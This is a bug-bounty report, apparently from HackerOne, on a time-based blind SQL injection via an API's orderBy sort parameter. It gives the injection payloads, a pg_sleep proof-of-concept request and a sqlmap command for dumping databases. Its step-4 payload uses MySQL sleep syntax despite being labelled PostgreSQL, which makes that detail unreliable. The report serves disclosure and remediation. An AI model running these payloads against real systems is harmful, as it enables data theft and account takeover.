# Title: SQL Injection via ORDER BY Parameter in Online Course Platform

- **Platform**: HackerOne
- **Program**: Redacted (Online Course Platform)
- **Severity**: High
- **Date**: 2024-10-15
- **Researcher**: mfthylmaz
- **Bounty**: Undisclosed

## Summary
A time-based SQL injection vulnerability was discovered in the `orderBy` parameter of an online course platform's API endpoint. The application was using PostgreSQL and the lack of parameterized queries allowed an attacker to manipulate SQL queries via the sort parameter.

## Technical Details
The API endpoint `/api/categories?cacheId=undefined&parentId=null&orderBy=priority:asc` was responsible for fetching course categories. The `orderBy` parameter was directly concatenated into the SQL `ORDER BY` clause without sanitization. This allowed the researcher to inject arbitrary SQL that would be processed by the PostgreSQL database.

When the researcher modified the value to `asc+LIMIT+1+--`, the response returned only a single value, confirming that the SQL query was being manipulated. The application was confirmed to be using PostgreSQL.

## Steps to Reproduce
1. Browse the online course platform while monitoring API requests in Burp Suite
2. Identify the endpoint: `/api/categories?orderBy=priority:asc`
3. Test with: `orderBy=asc+LIMIT+1+--` and observe single result returned
4. Test time-based injection with PostgreSQL:
   `orderBy=priority:asc;(select*from(select(sleep(5)))a)--`
5. Observe 5-second delay, confirming blind SQL injection
6. Use SQLMap to extract database contents

## Proof of Concept
```
Request:
GET /api/categories?cacheId=undefined&parentId=null&orderBy=priority:asc;select%20pg_sleep(5)-- HTTP/1.1
Host: api.example.com

Response time: ~5 seconds (confirming injection)
```

The final exploitation used sqlmap with the PostgreSQL-specific payloads:
```bash
sqlmap -u "https://api.example.com/api/categories?orderBy=priority:asc" --technique=T --dbs
```

## Impact
- Full database extraction including user credentials
- Access to course content and enrollment data
- Potential access to payment information
- User account takeover via credential extraction
- Complete compromise of the application database

## Remediation
The development team implemented parameterized queries for the ORDER BY clause. Input validation was added to restrict allowed sort parameters to a whitelist of column names and sort directions.

## References
- https://medium.com/@mfthylmaz/sql-injection-via-order-by-parameter-a7cb7d04017f
